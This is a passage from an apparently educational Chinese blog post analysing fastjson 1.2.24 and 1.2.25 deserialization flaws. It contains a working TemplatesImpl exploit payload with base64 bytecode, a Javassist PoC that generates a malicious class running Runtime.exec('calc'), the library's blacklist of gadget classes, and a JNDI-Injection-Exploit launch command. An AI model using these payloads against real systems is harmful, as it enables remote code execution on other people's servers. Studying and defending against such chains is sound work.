class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后直接弹出计算器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531505319-fa84e999-7bcc-4ab6-88d1-19f1320c3600.png#averageHue=%23cdbd80&clientId=u8272b843-0f56-4&from=paste&height=823&id=uc52db734&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=341524&status=done&style=none&taskId=u0e020ad7-3fe4-46d4-94ec-9f98e57fb3b&title=&width=1536" alt="image.png"></p><h3 id="（2）漏洞成因分析"><a href="#（2）漏洞成因分析" class="headerlink" title="（2）漏洞成因分析"></a>（2）漏洞成因分析</h3><p>上面的<code>text</code>里面的<code>_bytecodes</code>的内容是以下内容编译成字节码文件后（<code>.class</code>）再<code>base64</code>编码后的结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们通过以上代码直接定义类<code>Test</code>，并在类的构造方法中执行<code>calc</code>的命令；至于为什么要写上述代码的第<code>14</code>-<code>21</code>行，因为<code>Test</code>类是继承<code>AbstractTranslet</code>的，上述代码的两个<code>transform</code>方法都是实现<code>AbstractTranslet</code>接口的抽象方法，因此都是需要的；具体来说的话，第一个<code>transform</code>带有<code>SerializationHandler</code>参数，是为了把<code>XML</code>文档转换为另一种格式，第二个<code>transform</code>带有<code>DTMAxisIterator</code>参数，是为了对<code>XML</code>文档中的节点进行迭代。<br><strong>总结：</strong>对于上述代码，应该这么理解：建立<code>Test</code>类，并让其继承<code>AbstractTranslet</code>类，然后通过<code>Test t = new Test();</code>来初始化，这样我就是假装要把<code>xml</code>文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行<code>calc</code>，所以会弹出计算器。</p><h4 id="①问题1：为什么要继承AbstractTranslet类？"><a href="#①问题1：为什么要继承AbstractTranslet类？" class="headerlink" title="①问题1：为什么要继承AbstractTranslet类？"></a>①问题1：为什么要继承<code>AbstractTranslet</code>类？</h4><p>参考<code>Y4tacker</code>师傅的文章：</p><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/119082164">https://blog.csdn.net/solitudi/article/details/119082164</a></p></blockquote><p>但是在实战场景中，<code>Java</code>的<code>ClassLoader</code>类提供了<code>defineClass()</code>方法，可以把字节数组转换成<code>Java</code>类的示例，但是这里面的方法的作用域是被<code>Protected</code>修饰的，也就是说这个方法只能在<code>ClassLoader</code>类中访问，不能被其他包中的类访问：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590757100-eb95f1f7-40f6-4d0e-9709-e05ec7fd2f05.png#averageHue=%23f7f6ee&clientId=u8272b843-0f56-4&from=paste&height=501&id=u7f65687c&name=image.png&originHeight=626&originWidth=1663&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129161&status=done&style=none&taskId=ucc0eb086-134e-4e75-971f-1440c66f5e8&title=&width=1330.4" alt="image.png"><br>但是，在<code>TransletClassLoader</code>类中，<code>defineClass</code>调用了<code>ClassLoader</code>里面的<code>defineClass</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590943310-12009aa2-effc-4ba3-9ea3-3d9e71b1e27b.png#averageHue=%23f9f7ee&clientId=u8272b843-0f56-4&from=paste&height=673&id=uf214e094&name=image.png&originHeight=841&originWidth=1627&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177301&status=done&style=none&taskId=u739d2600-283f-43c4-a34d-3f37b5675be&title=&width=1301.6" alt="image.png"><br>然后追踪<code>TransletClassLoader</code>，发现是<code>defineTransletClasses</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591071672-d20557c6-a17f-4e54-b067-02a5a910ba00.png#averageHue=%23f9f7ef&clientId=u8272b843-0f56-4&from=paste&height=800&id=u1b179c9a&name=image.png&originHeight=1000&originWidth=1667&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=217032&status=done&style=none&taskId=ub78e3007-2549-44d3-a28d-04ff105aadc&title=&width=1333.6" alt="image.png"><br>再往上，发现是<code>getTransletInstance</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591219803-00065e5e-90d0-4ea9-b479-581757ad459a.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=818&id=ucd5e69df&name=image.png&originHeight=1023&originWidth=1758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=233805&status=done&style=none&taskId=uad2e9d73-4970-4c88-9954-2c18b173cd0&title=&width=1406.4" alt="image.png"><br>到此为止，要么是<code>Private</code>修饰要么就是<code>Protected</code>修饰，再往上继续追踪，发现是<code>newTransformer</code>，可以看到此时已经是<code>public</code>了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591302146-a7b5b704-09d7-415a-9ca3-758299c2ff8f.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=ud66221b0&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=227283&status=done&style=none&taskId=u192efad0-965c-407e-847d-e6e933611b0&title=&width=1536" alt="image.png"><br>因此，我们的利用链是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>基于此，我们可以写出如下<code>POC</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;W01fh4cker&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;W01h4cker&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就可以动态生成恶意类，执行效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680592080496-8eff1e08-d95e-4b92-8b44-2579a56b705b.png#averageHue=%23f7f5f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0860b899&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270888&status=done&style=none&taskId=u7149eba7-8b8d-4b15-9b99-aa6aca29b2c&title=&width=1536" alt="image.png"></p><h4 id="②为什么要这么构造json？"><a href="#②为什么要这么构造json？" class="headerlink" title="②为什么要这么构造json？"></a>②为什么要这么构造<code>json</code>？</h4><p>可以看到，我们最终构造的json数据为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line"><span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line"><span class="string">&quot;_name&quot;</span>: <span class="string">&quot;W01fh4cker&quot;</span>,</span><br><span class="line"><span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line"><span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么这么构造呢？还是直接看<code>defineTransletClasses</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594202033-dc9f3a2c-1ced-4c47-9502-65b1dbf11ccc.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=ub4654356&name=image.png&originHeight=1023&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204152&status=done&style=none&taskId=ua3d301b2-2ec5-4f36-ab5a-5e3e178f6d8&title=&width=1534.4" alt="image.png"><br>可以看到，逻辑是这样的：先判断<code>_bytecodes</code>是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的<code>ClassLoader</code>去加载<code>_bytecodes</code>中的<code>byte[]</code>，并对类的父类进行判断，如果是<code>ABSTRACT_TRANSLET</code>也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，那么就把类成员属性的<code>_transletIndex</code>设置成当前循环中的标记位，第一次调用的话，就是<code>class[0]</code>。<br>可以看到，这里的<code>_bytecodes</code>和<code>_outputProperties</code>都是类成员变量。同时，<code>_outputProperties</code>有自己的<code>getter</code>方法，也就是<code>getOutputProperties</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594021516-01ba0d37-4b23-4fec-965c-2b1bc267f9a6.png#averageHue=%23fbf7f6&clientId=u8272b843-0f56-4&from=paste&height=694&id=u6e694cd4&name=image.png&originHeight=868&originWidth=857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79396&status=done&style=none&taskId=u140ff6c7-e7d4-4dfd-90b3-87f1b763daf&title=&width=685.6" alt="image.png"><br><strong>总结：说详细一点，</strong><code>**TemplatesImpl**</code><strong>利用链的整体思路如下：</strong><br><strong>构造一个</strong><code>**TemplatesImpl**</code><strong>类的反序列化字符串，其中</strong><code>**_bytecodes**</code><strong>是我们构造的恶意类的类字节码，这个类的父类是</strong><code>**AbstractTranslet**</code><strong>，最终这个类会被加载并使用</strong><code>**newInstance()**</code><strong>实例化。在反序列化过程中，由于</strong><code>**getter**</code><strong>方法</strong><code>**getOutputProperties()**</code><strong>满足条件，将会被</strong><code>**fastjson**</code><strong>调用，而这个方法触发了整个漏洞利用流程：</strong><code>**getOutputProperties()**</code>** -&gt; <strong><code>**newTransformer()**</code></strong> -&gt; <strong><code>**getTransletInstance()**</code></strong> -&gt; <strong><code>**defineTransletClasses()**</code></strong> &#x2F; **<code>**EvilClass.newInstance()**</code><strong>。</strong><br><strong>限制条件也很明显：需要代码中加了</strong><code>Feature.SupportNonPublicField</code>。</p><h2 id="2-fastjson-1-2-25-反序列化漏洞（学习JdbcRowSetImpl链的相关知识）"><a href="#2-fastjson-1-2-25-反序列化漏洞（学习JdbcRowSetImpl链的相关知识）" class="headerlink" title="2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）"></a>2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）</h2><h3 id="（1）黑白名单机制介绍"><a href="#（1）黑白名单机制介绍" class="headerlink" title="（1）黑白名单机制介绍"></a>（1）黑白名单机制介绍</h3><p>众所周知，在<code>fastjson</code>自爆<code>1.2.24</code>版本的反序列化漏洞后，<code>1.2.25</code>版本就加入了黑白名单机制。<br>例如我们更换并下载<code>1.2.25</code>版本的<code>fastjson</code>，然后再去执行原来的<code>poc</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602428789-1bd4d27c-554f-4f7d-ba10-70335c95979c.png#averageHue=%23f8f6ee&clientId=u8272b843-0f56-4&from=paste&height=685&id=u6a605695&name=image.png&originHeight=856&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126619&status=done&style=none&taskId=ue1acbefb-caac-4575-bda5-3046c4afec8&title=&width=909.6" alt="image.png"><br>就会提示我们<code>autoType is not support</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602460437-b6fdf70e-144d-4fbf-a81a-0cdc6586e965.png#averageHue=%23f8f5f3&clientId=u8272b843-0f56-4&from=paste&height=815&id=uca9dbb44&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=286568&status=done&style=none&taskId=u1332263e-921c-4bf2-83fe-190f3bc94df&title=&width=1536" alt="image.png"><br>查看源码可以发现这里定义了反序列化类的黑名单：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680604869097-81a97752-c1dd-4296-950f-0fd01d4930fc.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=ueb7677c7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231734&status=done&style=none&taskId=ue12fd80e-38a9-418e-8256-aefa689e6e5&title=&width=1536" alt="image.png"><br>具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>接下来我们定位到<code>checkAutoType()</code>方法，看一下它的逻辑：如果开启了<code>autoType</code>，那么就先判断类名在不在白名单中，如果在就用<code>TypeUtils.loadClass</code>加载，如果不在就去匹配黑名单：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680605036525-87782994-bf9a-402e-b296-12fc30a4fbfb.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u21ab298d&name=image.png&originHeight=1024&originWidth=1629&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193217&status=done&style=none&taskId=u1dcddc72-8c1a-4022-a3ca-963d93ef79f&title=&width=1303.2" alt="image.png"><br>如果没开启<code>autoType</code>，则先匹配黑名单，然后再白名单匹配和加载；<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680611575004-0fd9b05b-be51-4d38-98c8-b4275ffb8d24.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=ud6928fab&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208537&status=done&style=none&taskId=u427e137d-c780-4bfd-8c2d-127e1e67626&title=&width=1536" alt="image.png"><br>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。<br>我们跟进一下这里的<code>loadClass</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612305580-814698ec-124a-4163-ae33-7095c8652d77.png#averageHue=%23fbf9f7&clientId=u8272b843-0f56-4&from=paste&height=630&id=ucd579f2f&name=image.png&originHeight=787&originWidth=1309&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134082&status=done&style=none&taskId=u3db5682b-8f05-4cd7-b3e3-c39a95a5231&title=&width=1047.2" alt="image.png"><br>问题就出在这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612341139-7fe94d48-277e-42c7-a3db-fc3800c6a3d3.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=726&id=u046e0f4e&name=image.png&originHeight=907&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216516&status=done&style=none&taskId=u255b3b53-4577-4571-9eae-fc3a74890ba&title=&width=1532" alt="image.png"><br>我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以<code>[</code>开头，则说明该类是一个数组类型，需要递归调用<code>loadClass</code>方法来加载数组元素类型对应的<code>Class</code>对象，然后使用<code>Array.newIntrance</code>方法来创建一个空数组对象，最后返回该数组对象的<code>Class</code>对象；如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则说明该类是一个普通的<code>Java</code>类，需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code>。</p><h3 id="（2）黑白名单绕过的复现"><a href="#（2）黑白名单绕过的复现" class="headerlink" title="（2）黑白名单绕过的复现"></a>（2）黑白名单绕过的复现</h3><p>基于以上的分析，我们可以发现，只要我们把<code>payload</code>简单改一下就可以绕过。<br>我们需要先开启默认禁用的<code>autoType</code>，有以下三种方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.example.,org.javaweb.&quot;</span>);或者ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.</span><br><span class="line">在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.</span><br></pre></td></tr></table></figure><p>我们先去<code>[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)</code>下载个<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，然后启动利用工具：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -A <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -C <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure><p>选择下面的<code>JDK 1.8</code>的：<br><img 